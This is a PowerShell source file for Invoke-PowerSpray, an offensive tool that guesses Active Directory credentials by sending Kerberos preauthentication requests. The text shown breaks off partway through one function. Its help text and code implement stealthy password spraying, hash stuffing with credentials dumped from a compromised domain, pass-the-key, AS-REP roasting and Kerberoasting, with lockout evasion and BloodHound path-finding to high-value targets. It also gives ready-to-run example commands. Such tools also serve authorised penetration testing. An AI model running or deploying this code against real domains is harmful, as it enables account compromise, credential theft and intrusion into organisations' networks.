Function Invoke-PowerSpray {
<#
.SYNOPSIS
    Guess Active Directory credentials via Kerberos preauthentication.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Invoke-PowerSpray checks usernames and passwords (plain-text or NTLM hashes) by sending Kerberos AS-REQ.
    Spraying attack can be performed against all the domain users retrieved from LDAP directory, while checking their "badPwdCount" attribute to prevent account lockout and identify previous passwords.
    Stuffing attack can be performed using NTLM password hashes dumped from a compromised domain against another target domain in order to identify credential reuse.
    Since failing Kerberos preauthentication does not trigger traditional logon failure event, it may be a stealthy way to credential guessing.
    Moreover, roasting attacks can be performed to retrieve encrypted material via users that do not have preauthentication required.
    It is highly inspired from Rubeus (by @harmj0y) for the Kerberos part and from Invoke-BadPwdCountScanner (by @rindert-fox) for the LDAP part.

.PARAMETER UserName
    Specifies the identifier of an account to send the AS-REQ for.

.PARAMETER UserFile
    Specifies a file containing a list of usernames to send the AS-REQ for.

.PARAMETER ServiceName
    Specifies the identifier of a service account to target for kerberoasting.

.PARAMETER ServiceFile
    Specifies a file containing a list of service names to target for kerberoasting.

.PARAMETER EmptyPassword
    Specifies empty password for each authentication attempt. When `-Ldap` switch is enabled, user list is filtered based on the UF_PASSWD_NOTREQD flag.

.PARAMETER UserAsPassword
    Specifies username as password for each authentication attempt (default case, lowercase or uppercase).

.PARAMETER PreCreatedComputer
    Specifies computer name as password (without the trailing '$') or empty password for each authentication attempt.

.PARAMETER Password
    Specifies the password for authentication attempts.

.PARAMETER Hash
    Specifies the NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.

.PARAMETER DumpFile
    Specifies a dump file containing NTLM password hashes in the format <domain>\<username>:<uid>:<LM-hash>:<NT-hash>:<comment>:<homedir>: (e.g secretsdump's output).

.PARAMETER EncType
    Specifies the encryption type for Kerberos, defaults to AES256 (AES256-CTS-HMAC-SHA1-96). When NTLM hash is used for authentication, it is downgraded to RC4 (ARCFOUR-HMAC-MD5).

.PARAMETER Server
    Specifies the domain controller to send the AS-REQ to.

.PARAMETER Ldap
    Enables domain account enumeration via LDAP.

.PARAMETER LdapCredential
    Specifies credentials to use for LDAP bind.

.PARAMETER CheckOldPwd
    Enables old password discovery by checking the badPwdCount attribute after each unsuccessful authentication.

.PARAMETER LockoutThreshold
    Specifies the maximum value of the badPwdCount attribute of the target users enumerated via LDAP.
    By default, value is based on domain's Default Password Policy.

.PARAMETER Delay
    Specifies the delay (in seconds) between authentication attempts, defaults to 0.

.PARAMETER Jitter
    Specifies the jitter (0-1.0) to any specified delay, defaults to +/- 0.3.

.PARAMETER Threads
    Specifies the number of threads to use for authentication attempts, defaults to 1.

.PARAMETER BloodHound
    Enables Bloodhound integration to identify path to high value targets.

.PARAMETER Neo4jCredential
    Specifies credentials for BloodHound's Neo4j database.

.PARAMETER Neo4jHost
    Specifies Neo4j server address.

.PARAMETER Neo4jPort
    Specifies Neo4j server port.

.EXAMPLE
    Discovering valid usernames, from an unauthenticated context:
    PS C:\> Invoke-PowerSpray -Server 192.168.1.10 -UserFile .\users.lst

.EXAMPLE
    Kerberoasting using a given account without preauthentication enabled, from an unauthenticated context:
    PS C:\> Invoke-PowerSpray -Server 192.168.1.10 -UserName testuser -ServiceList .\services.lst -EncType RC4

.EXAMPLE
    ASREP roasting and Kerberoasting using AS-REQ without preauthentication data, from an authenticated context:
    PS C:\> Invoke-PowerSpray -Ldap -EncType RC4

.EXAMPLE
    Password spraying against all domain users using username as password:
    PS C:\> Invoke-PowerSpray -Server DC.ADATUM.CORP -Ldap -UserAsPassword default -BloodHound -Neo4jCredential neo4j

.EXAMPLE
    Password spraying against pre-created computer accounts:
    PS C:\> Invoke-PowerSpray -Server DC.ADATUM.CORP -Ldap -PreCreatedComputer ComputerAsPassword

.EXAMPLE
    Password spraying against all domain users using a given password:
    PS C:\> Invoke-PowerSpray -Server DC.ADATUM.CORP -Ldap -LdapCredential testuser@ADATUM.CORP -Password 'Welcome2020'

.EXAMPLE
    Pass-the-key attack targeting a specific account using a given password hash:
    PS C:\> Invoke-PowerSpray -Server DC.ADATUM.CORP -UserName testuser -Hash F6F38B793DB6A94BA04A52F1D3EE92F0

.EXAMPLE
    Password stuffing using a hash dump extracted from a previously compromised domain:
    PS C:\> Invoke-PowerSpray -Server ADATUM.CORP -DumpFile .\CONTOSO.ntds -Threads 5
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $UserName,

        [ValidateScript({Test-Path $_ -PathType Leaf})]
        [String]
        $UserFile,

        [ValidateNotNullOrEmpty()]
        [String]
        $ServiceName,

        [ValidateScript({Test-Path $_ -PathType Leaf})]
        [String]
        $ServiceFile,

        [Switch]
        $EmptyPassword,

        [ValidateSet('default', 'lowercase', 'uppercase')]
        [String]
        $UserAsPassword,

        [ValidateSet('ComputerAsPassword', 'EmptyPassword')]
        [String]
        $PreCreatedComputer,

        [String]
        $Password,

        [ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})]
        [String]
        $Hash,

        [ValidateScript({Test-Path $_ -PathType Leaf})]
        [String]
        $DumpFile,

        [ValidateSet('RC4', 'AES256', 'AES128', 'DES')]
        [String]
        $EncType = 'AES256',

        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $Ldap,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $LdapCredential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $CheckOldPwd,

        [Int]
        $LockoutThreshold,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = 0.3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 1,

        [Switch]
        $BloodHound,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Neo4jCredential = (New-Object Management.Automation.PSCredential ("neo4j", $(ConvertTo-SecureString 'neo4j' -AsPlainText -Force))),

        [ValidateNotNullOrEmpty()]
        [String]
        $Neo4jHost = '127.0.0.1',

        [ValidateNotNullOrEmpty()]
        [Int]
        $Neo4jPort = 7474
    )

    try {
        $searchString = "LDAP://$Server/RootDSE"
        $rootDSE = New-Object DirectoryServices.DirectoryEntry($searchString, $null, $null)
        $defaultNC = $rootDSE.defaultNamingContext[0]
        $adsPath = "LDAP://$Server/$defaultNC"
        $domain = $defaultNC -replace 'DC=' -replace ',','.'
    }
    catch {
        Write-Error "Domain controller unreachable" -ErrorAction Stop
    }

    # Check if the Server parameter is an IP address
    try {
        [Net.IPAddress]::Parse($Server) | Out-Null
    }
    catch {
        $Server = (Resolve-DnsName -Name $Server -Type A -Verbose:$false).IPAddress | Select-Object -First 1
    }

    if ($CheckOldPwd) {
        $Ldap = $true
    }
    if ($Ldap) {
        if ($CheckOldPwd -and ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash') -or $PSBoundParameters.ContainsKey('UserAsPassword') -or $PSBoundParameters.ContainsKey('EmptyPassword'))) {
            # Check if the Server has PDC role
            $pdcServers = (Resolve-DnsName -Server $domain -Name "_ldap._tcp.pdc._msdcs.$domain" -Type SRV -Verbose:$false).IPAddress
            if (-not ($pdcServers.Contains($Server))) {
                Write-Warning "The domain controller specified doesn't not seem to have PDC role. Bad result may occur due to replication issues with badPwdCount attribute"
            }
        }

        if (-not $LockoutThreshold -and ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash') -or $PSBoundParameters.ContainsKey('UserAsPassword') -or $PSBoundParameters.ContainsKey('EmptyPassword') -or $PSBoundParameters.ContainsKey('PreCreatedComputer'))) {
            # Get lockout threshold defined in Default Password Policy
            $LockoutThreshold = (Get-LdapObject -ADSpath $adsPath -Credential $LdapCredential -Filter '(objectClass=domain)' -Properties 'lockoutThreshold' -SearchScope 'Base').lockoutThreshold
            Write-Warning "LockoutThreshold value defined in Default Password Policy is $LockoutThreshold"
        }

        $properties = @('sAMAccountName', 'badPwdCount', 'userAccountControl', 'msds-supportedencryptiontypes')
    }

    $pass = $null
    if ($PSBoundParameters.ContainsKey('Password')) {
        $pass = $Password
    }
    if ($PSBoundParameters.ContainsKey('EmptyPassword')) {
        $pass = ''
    }
    if ($PSBoundParameters.ContainsKey('PreCreatedComputer')) {
        if (-not $PSBoundParameters.ContainsKey('EncType')) {
            $EncType = 'RC4'
        }
        if ($PreCreatedComputer -eq 'EmptyPassword') {
            $pass = ''
        }
    }

    $nthash = $null
    if ($PSBoundParameters.ContainsKey('Hash')) {
        $EncType = 'RC4'
        if($Hash -like "*:*") {
            $nthash = $Hash.SubString(($Hash.IndexOf(":") + 1),32)
        }
        else {
            $nthash = $Hash
        }
    }

    $services = @()
    if ($ServiceName) {
        $services += $ServiceName
    }
    elseif ($ServiceFile) {
        $ServiceFilePath = Resolve-Path -Path $ServiceFile
        foreach ($serviceName in Get-Content $ServiceFilePath) {
            if ($Ldap) {
                $filter = "&((samAccountName=$serviceName)(servicePrincipalName=*))"
                if (-not ($service = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential)) {
                    Write-Verbose "$($serviceName)@$($domain) does not exist"
                }
            }
            if ($service -or -not $Ldap) {
                $services += $serviceName
            }
        }
    }

    $badPwdCount = -1
    $user = $null
    $credentials = New-Object Collections.ArrayList

    if ($UserName) {
        if ($Ldap) {
            $filter = "(samAccountName=$UserName)"
            if ($PSBoundParameters.ContainsKey('EmptyPassword')) {
                $filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=32)$filter)"
            }
            if ($PSBoundParameters.ContainsKey('PreCreatedComputer')) {
                $filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=32)(userAccountControl:1.2.840.113556.1.4.803:=4096)$filter)"
            }
            if ($user = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential) {
                $badPwdCount = $user.badPwdCount
            }
            else {
                Write-Error "$($UserName)@$($domain) does not exist" -ErrorAction Stop
            }
        }
        if ($PSBoundParameters.ContainsKey('UserAsPassword')) {
            switch ($UserAsPassword) {
                lowercase {
                    $pass = $UserName.ToLower()
                }
                uppercase {
                    $pass = $UserName.ToUpper()
                }
                default {
                    $pass = $UserName
                }
            }
        }
        if ($PSBoundParameters.ContainsKey('PreCreatedComputer') -and $PreCreatedComputer -eq 'ComputerAsPassword') {
            $pass = $UserName.ToLower().TrimEnd('$')
        }
        $cred = [pscustomobject] @{Domain = $domain; UserName = $UserName; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
        $credentials.add($cred) | Out-Null
    }
    elseif ($UserFile) {
        $UserFilePath = Resolve-Path -Path $UserFile
        foreach ($userName in Get-Content $UserFilePath) {
            if ($Ldap) {
                $filter = "(samAccountName=$userName)"
                if ($PSBoundParameters.ContainsKey('EmptyPassword')) {
                    $filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=32)$filter)"
                }
                if ($PSBoundParameters.ContainsKey('PreCreatedComputer')) {
                    $filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=32)(userAccountControl:1.2.840.113556.1.4.803:=4096)$filter)"
                }
                if ($user = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential) {
                    $badPwdCount = $user.badPwdCount
                }
                else {
                    Write-Verbose "$($userName)@$($domain) does not exist"
                }
            }
            if ($user -or -not $Ldap) {
                if ($PSBoundParameters.ContainsKey('UserAsPassword')) {
                    switch ($UserAsPassword) {
                        lowercase {
                            $pass = $userName.ToLower()
                        }
                        uppercase {
                            $pass = $userName.ToUpper()
                        }
                        default {
                            $pass = $userName
                        }
                    }
                }
                if ($PSBoundParameters.ContainsKey('PreCreatedComputer') -and $PreCreatedComputer -eq 'ComputerAsPassword') {
                    $pass = $UserName.ToLower().TrimEnd('$')
                }
                $cred = [pscustomobject] @{Domain = $domain; UserName = $userName; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
                $credentials.add($cred) | Out-Null
            }
        }
    }
    elseif ($DumpFile) {
        $dumpFilePath = Resolve-Path -Path $DumpFile
        foreach ($line in Get-Content $dumpFilePath) {
            $dump = $line.Split(':')
            $userName = $dump[0]
            if ($userName) {
                if ($userName.Contains('\')) {
                    $userName = $userName.split('\')[1]
                }
                if ($Ldap) {
                    $filter = "(samAccountName=$userName)"
                    if ($PSBoundParameters.ContainsKey('EmptyPassword')) {
                        $filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=32)$filter)"
                    }
                    if ($PSBoundParameters.ContainsKey('PreCreatedComputer')) {
                        $filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=32)(userAccountControl:1.2.840.113556.1.4.803:=4096)$filter)"
                    }
                    if ($user = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential) {
                        $badPwdCount = $user.badPwdCount
                    }
                    else {
                        Write-Verbose "$($userName)@$($domain) does not exist"
                    }
                }
                if ($user -or -not $Ldap) {
                    $nthash = $dump[3]
                    if ($PSBoundParameters.ContainsKey('UserAsPassword')) {
                        $nthash = $null
                        switch ($UserAsPassword) {
                            lowercase {
                                $pass = $userName.ToLower()
                            }
                            uppercase {
                                $pass = $userName.ToUpper()
                            }
                            default {
                                $pass = $userName
                            }
                        }
                    }
                    if ($PSBoundParameters.ContainsKey('PreCreatedComputer') -and $PreCreatedComputer -eq 'ComputerAsPassword') {
                        $pass = $UserName.ToLower().TrimEnd('$')
                    }
                    $cred = [pscustomobject] @{Domain = $domain; UserName = $userName; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
                    $credentials.add($cred) | Out-Null
                }
            }
        }
    }
    elseif ($Ldap) {
        $filter = ''
        $disabledUserAccountControl = 2,514,546,66050,66082,262658,262690,328194,328226
        foreach($userAccountControl in $disabledUserAccountControl) {
            $filter += "(!userAccountControl:1.2.840.113556.1.4.803:=$userAccountControl)"
        }
        if (-not ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash') -or $PSBoundParameters.ContainsKey('UserAsPassword') -or $PSBoundParameters.ContainsKey('EmptyPassword') -or $PSBoundParameters.ContainsKey('PreCreatedComputer'))) {
            # Find all enabled users without kerberos preauthentication enabled (AS-REP roasting)
            $filter1 = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)$filter)"
            $users = Get-LdapObject -ADSpath $adsPath -Filter $filter1 -Properties $properties -Credential $LdapCredential
            if (($users | Measure-Object).Count -gt 0) {
                # Find all enabled users with a SPN (Kerberoasting)
                $filter2 = "(&(samAccountType=805306368)(servicePrincipalName=*)$filter)"
                $services = (Get-LdapObject -ADSpath $adsPath -Filter $filter2 -Properties $properties -Credential $LdapCredential).sAMAccountName
            }
        }
        else {
            if ($LockoutThreshold -gt 0) {
                $filter = "(&(!(badPwdCount>=$LockoutThreshold))$filter)"
            }
            if ($PSBoundParameters.ContainsKey('EmptyPassword')) {
                $filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=32)$filter)"
            }
            if ($PSBoundParameters.ContainsKey('PreCreatedComputer')) {
                # Find all enabled computers with badPwdCount < LockoutThreshold that have never been used (spraying)
                $filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=32)(userAccountControl:1.2.840.113556.1.4.803:=4096)(logonCount=0)$filter)"
            }
            else {
                # Find all enabled users with badPwdCount < LockoutThreshold (spraying)
                $filter = "(&(samAccountType=805306368)$filter)"
            }
            $users = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential
        }
        foreach ($user in $users) {
            if ($PSBoundParameters.ContainsKey('UserAsPassword')) {
                switch ($UserAsPassword) {
                    lowercase {
                        $pass = $user.samAccountName.ToLower()
                    }
                    uppercase {
                        $pass = $user.samAccountName.ToUpper()
                    }
                    default {
                        $pass = $user.samAccountName
                    }
                }
            }
            if ($PSBoundParameters.ContainsKey('PreCreatedComputer') -and $PreCreatedComputer -eq 'ComputerAsPassword') {
                $pass = $user.samAccountName.ToLower().TrimEnd('$')
            }
            $cred = [pscustomobject] @{Domain = $domain; UserName = $user.samAccountName; Password = $pass; NTHash = $nthash; BadPwdCount = $user.badPwdCount}
            $credentials.add($cred) | Out-Null
        }
    }
    else {
        Write-Error "Either UserName, UserFile, DumpFile or Ldap parameter must be specified" -ErrorAction Stop
    }

    $params = @{
        EncType = $EncType
        Server = $Server
        ADSpath = $adsPath
        Delay = $Delay
        Jitter = $Jitter
        Ldap = $Ldap
        LdapCredential = $LdapCredential
        CheckOldPwd = $CheckOldPwd
        LockoutThreshold = $LockoutThreshold
        BloodHound = $BloodHound
        Neo4jCredential = $Neo4jCredential
        Neo4jHost = $Neo4jHost
        Neo4jPort = $Neo4jPort
        Verbose = $VerbosePreference
        Services = $services
    }

    if ($PSBoundParameters['Delay'] -or $credentials.Count -eq 1 -or $Threads -eq 1) {
        New-KerberosSpray @params -Collection $credentials
    }
    elseif ($credentials) {
        New-ThreadedFunction -ScriptBlock ${function:New-KerberosSpray} -ScriptParameters $params -Collection $credentials.ToArray() -Threads $Threads
    }
}

Function Local:New-KerberosSpray {
    [CmdletBinding()]
    Param (
        [Collections.ArrayList]
        $Collection,

        [Parameter(Mandatory = $True)]
        [String]
        $Server,

        [ValidateSet('RC4', 'AES256', 'AES128', 'DES')]
        [string]
        $EncType = 'AES256',

        [UInt32]
        $Delay,

        [Double]
        $Jitter,

        [Switch]
        $Ldap,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $LdapCredential,

        [Switch]
        $CheckOldPwd,

        [Int]
        $LockoutThreshold,

        [String]
        $ADSpath,

        [Switch]
        $BloodHound,

        [Management.Automation.PSCredential]
        $Neo4jCredential,

        [String]
        $Neo4jHost,

        [Int]
        $Neo4jPort,

        [String[]]
        $Services
    )

    switch ($EncType) {
        'DES' {
            # ETYPE 3 = DES-CBC-MD5
            $eType = 3
        }
        'AES128' {
            # ETYPE 17 = AES128-CTS-HMAC-SHA1-96
            $eType = 17
        }
        'AES256' {
            # ETYPE 18 = AES256-CTS-HMAC-SHA1-96
            $eType = 18
        }
        'RC4' {
            # ETYPE 23 = ARCFOUR-HMAC-MD5
            $eType = 23
        }
    }

    $keyBytes = $null
    $noPreauthUser = $null

    if ($CheckOldPwd) {
        $currentUser = ((Get-LdapCurrentUser -Server $Server -Credential $LdapCredential).Split('\\'))[1]
    }

    foreach ($cred in $Collection) {
        if ($cred.badPwdCount -eq -1) {
            $cred.PSObject.Properties.Remove('BadPwdCount')
        }

        if ($cred.Password -or $cred.NTHash -and $LockoutThreshold -gt 0 -and $cred.badPwdCount -ge $LockoutThreshold) {
            $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Skipped'
            $cred.PSObject.Properties.Remove('Password')
            $cred.PSObject.Properties.Remove('NTHash')
            Write-Output $cred
            continue
        }

        if ($cred.Password -ne $null) {
            $salt = "$($cred.Domain.ToUpper())$($cred.Username)"
            $keyBytes = KerberosPasswordHash -eType $eType -Password $cred.Password -Salt $salt
            $cred.PSObject.Properties.Remove('NTHash')
        }
        elseif ($cred.NTHash) {
            # ETYPE 23 = ARCFOUR-HMAC-MD5
            $eType = 23
            $keyBytes = [byte[]] ($cred.NTHash -replace '..', '0x$&,' -split ',' -ne '')
            $cred.PSObject.Properties.Remove('Password')
        }
        else {
            $cred.PSObject.Properties.Remove('Password')
            $cred.PSObject.Properties.Remove('NTHash')
        }

        $AS_REP = New-KerbPreauth -EncType $eType -UserName $cred.Username -Key $keyBytes -Domain $cred.Domain -Server $Server
        $asn_AS_REP = [Asn1.AsnElt]::Decode($AS_REP, $false)
        $tag = $asn_AS_REP.TagValue

        # ERR_PREAUTH_REQUIRED
        if ($tag -eq 30) {
            $temp = $asn_AS_REP.Sub[0].Sub | Where-Object {$_.TagValue -eq 6}
            $error_code = [Convert]::ToUInt32($temp.Sub[0].GetInteger())

            switch ($error_code) {
                # KDC_ERR_C_PRINCIPAL_UNKNOWN
                6 {
                    Write-Verbose "$($cred.Username)@$($cred.Domain) does not exist" 
                    $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Invalid'
                }
                # KDC_ERR_ETYPE_NOSUPP
                14 {
                    $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'ETypeNotSupported'
                    if ($cred.Password) {
                        $cred.Password = $null
                    }
                    elseif ($cred.NTHash) {
                        $cred.NTHash = $null
                    }
                }
                # KDC_ERR_CLIENT_REVOKED
                18 {
                    $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Revoked'
                    if ($cred.Password) {
                        $cred.Password = $null
                    }
                    elseif ($cred.NTHash) {
                        $cred.NTHash = $null
                    }
                }
                # KDC_ERR_KEY_EXPIRED
                23 {
                    $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Expired'
                    if ($BloodHound) {
                        $pathNb = 0
                        $query = "
                        MATCH (n:User {name:'$($cred.Username.ToUpper())@$($cred.Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[*1..]->(m)) 
                        RETURN COUNT(p) AS pathNb
                        "
                        try {
                            $result = New-BloodHoundQuery -Query $query -Credential $Neo4jCredential -Neo4jHost $Neo4jHost -Neo4jPort $Neo4jPort
                            $pathNb = $result.data[0] | Where-Object {$_}
                            if ($pathNb -gt 0) {
                                $cred | Add-Member -MemberType NoteProperty -Name 'PathToHighValue' -Value $true
                            }
                            else {
                                $cred | Add-Member -MemberType NoteProperty -Name 'PathToHighValue' -Value $false
                            }
                        }
                        catch {
                            Write-Warning $Error[0].ErrorDetails.Message
                        }
                    }
                }
                # KDC_ERR_PREAUTH_FAILED
                24 {
                    $newBadPwdCount = $null
                    if ($CheckOldPwd -and ($($cred.Username) -ne $currentUser)) {
                        $filter = "(samAccountName=$($cred.Username))"
                        $newBadPwdCount = (Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties badPwdCount -Credential $LdapCredential).badPwdCount
                    }
                    if (($newBadPwdCount -ne $null) -and ($newBadPwdCount -eq $cred.BadPwdCount)) {
                        $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Renewed'
                        
                    }
                    else {
                        Write-Verbose "$($cred.Username)@$($cred.Domain) failed to authenticate"
                        $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Invalid'
                    }
                }
                # KDC_ERR_PREAUTH_REQUIRED
                25 {
                    if (-not $Ldap) {
                        $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Valid'
                    }
                }
                # KRB_AP_ERR_SKEW
                37 {
                    $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Valid'
                    if ($BloodHound) {
                        $pathNb = 0
                        $query = "
                        MATCH (n:User {name:'$($cred.Username.ToUpper())@$($cred.Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[*1..]->(m)) 
                        RETURN COUNT(p) AS pathNb
                        "
                        try {
                            $result = New-BloodHoundQuery -Query $query -Credential $Neo4jCredential -Neo4jHost $Neo4jHost -Neo4jPort $Neo4jPort
                            $pathNb = $result.data[0] | Where-Object {$_}
                            if ($pathNb -gt 0) {
                                $cred | Add-Member -MemberType NoteProperty -Name 'PathToHighValue' -Value $true
                            }
                            else {
                                $cred | Add-Member -MemberType NoteProperty -Name 'PathToHighValue' -Value $false
                            }
                        }
                        catch {
                            Write-Warning $Error[0].ErrorDetails.Message
                        }
                    }
                }
                # KDC_ERR_WRONG_REALM
                68 {
                    Write-Error "Invalid Kerberos REALM: $($cred.Domain)" -ErrorAction Stop
                }
                # https://tools.ietf.org/html/rfc1510#section-8.3
                default {
                    Write-Warning "Unknown error code for '$($cred.Username)@$($cred.Domain): $error_code"
                }
            }
        }
        # AS-REP
        elseif ($tag -eq 11) {
            if ($cred.Password -eq $null -and $cred.NTHash -eq $null) {
                $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'ASRepRoastable'
                $cred.PSObject.Properties.Remove('BadPwdCount')
                $encPart = $asn_AS_REP.Sub[0].Sub | Where-Object {$_.TagValue -eq 6}
                $temp = $encPart.Sub[0].Sub | Where-Object {$_.TagValue -eq 2}
                $cipher = $temp.Sub[0].GetOctetString()
                $repHash = [BitConverter]::ToString($cipher).Replace("-", $null)
                $asrepHash = $repHash.Insert(32, '$')
                $temp = $encPart.Sub[0].Sub | Where-Object {$_.TagValue -eq 0}
                $eType = $temp.Sub[0].GetInteger()
                $hash = "`$krb5asrep`$$($eType)`$$($cred.Username)@$($cred.Domain):$($asrepHash)"
                $cred | Add-Member -MemberType NoteProperty -Name 'KRB5Hash' -Value $hash
                $noPreauthUser = $cred # Store username for further Kerberoasting
            }
            else {
                $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Valid'
                if ($BloodHound) {
                    $pathNb = 0
                    $query = "
                    MATCH (n:User {name:'$($cred.Username.ToUpper())@$($cred.Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[*1..]->(m)) 
                    RETURN COUNT(p) AS pathNb
                    "
                    try {
                        $result = New-BloodHoundQuery -Query $query -Credential $Neo4jCredential -Neo4jHost $Neo4jHost -Neo4jPort $Neo4jPort
                        $pathNb = $result.data[0] | Where-Object {$_}
                        if ($pathNb -gt 0) {
                                $cred | Add-Member -MemberType NoteProperty -Name 'PathToHighValue' -Value $true
                            }
                            else {
                                $cred | Add-Member -MemberType NoteProperty -Name 'PathToHighValue' -Value $false
                            }
                    }
                    catch {
                        Write-Warning $Error[0].ErrorDetails.Message
                    }
                }
            }
        }
        else {
            Write-Warning "Unknown tag number for '$($cred.Username)@$($cred.domain): $tag'"
        }

        if ($cred.Status -ne 'Invalid') {
            Write-Output $cred
        }

        $randNb = New-Object Random
        $waitingTime = $randNb.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
        Start-Sleep -Seconds $waitingTime
    }

    if ($noPreauthUser) {
        # Kerberoasting without preauthentication
        foreach ($service in $Services) {
            $serviceCred = [pscustomobject] @{Domain = $domain; UserName = $service}
            $AS_REP = New-KerbPreauth -EncType $eType -UserName $noPreauthUser.Username -Domain $noPreauthUser.Domain -Server $Server -ServiceName $service
            $asn_AS_REP = [Asn1.AsnElt]::Decode($AS_REP, $false)
            $tag = $asn_AS_REP.TagValue
            if ($tag -eq 11) {
                # TODO: use decoded Asn1 structure instead of parsing raw ticket
                $ticketHexStream = [BitConverter]::ToString($AS_REP) -replace '-'
                if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    #$eType = [Convert]::ToByte($Matches.EtypeLen, 16)
                    $cipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16) - 4
                    $cipherText = $Matches.DataToEnd.Substring(0, $cipherTextLen*2)
                    $hashcat = $null
                    if (($eType -eq 18) -or ($eType -eq 17)) {
                        $checksumStart = $cipherTextLen - 24
                        $hash = "$($cipherText.Substring($checksumStart))`$$($cipherText.Substring(0, $checksumStart))"
                        $hashcat = "`$krb5tgs`$$($eType)`$$service`$$($serviceCred.Domain)`$*$service*`$$hash"
                    }
                    else {
                        $hash = "$($cipherText.Substring(0, 32))`$$($cipherText.Substring(32))"
                        $hashcat = "`$krb5tgs`$$($eType)`$*$service`$$($serviceCred.Domain)`$$service*`$$hash"
                    }
                    $serviceCred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'KerbeRoastable'
                    $serviceCred | Add-Member -MemberType NoteProperty -Name 'KRB5Hash' -Value $hashcat
                }
            }
            elseif ($tag -eq 30) {
                $serviceCred | Add-Member -MemberType NoteProperty -Name 'KRB5Hash' -Value $null
                $temp = $asn_AS_REP.Sub[0].Sub | Where-Object {$_.TagValue -eq 6}
                $error_code = [Convert]::ToUInt32($temp.Sub[0].GetInteger())
                switch ($error_code) {
                    # KDC_ERR_S_PRINCIPAL_UNKNOWN
                    7 {
                        Write-Verbose "$($serviceCred.Username)@$($serviceCred.Domain) is not a valid service" 
                        $serviceCred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Invalid'
                    }
                    # KDC_ERR_ETYPE_NOSUPP
                    14 {
                        $serviceCred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'ETypeNotSupported'
                    }
                    # https://tools.ietf.org/html/rfc1510#section-8.3
                    default {
                        Write-Warning "Unknown error code for '$($serviceCred.Username)@$($serviceCred.Domain): $error_code"
                    }
                }
            }
            Write-Output $serviceCred
        }
    }
}

Function Local:New-KerbPreauth {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserName,

        [Byte[]]
        $Key,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [ValidateSet(1, 3, 17, 18, 23, 24)]
        [Int]
        $EncType,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Server,

        [ValidateNotNullOrEmpty()]
        [String]
        $ServiceName = 'krbtgt'
    )

    $Address = [Net.IPAddress]::Parse($Server)
    $EndPoint = New-Object Net.IPEndPoint $Address, 88
    $Socket = New-Object Net.Sockets.Socket ([Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Stream, [Net.Sockets.ProtocolType]::TCP)
    $Socket.TTL = 128
    $ASREQ = New-ASReq -UserName $UserName -Domain $Domain -EncType $EncType -Key $Key -ServiceName $ServiceName
    $LengthBytes = [BitConverter]::GetBytes($ASREQ.Length)
    [Array]::Reverse($LengthBytes)
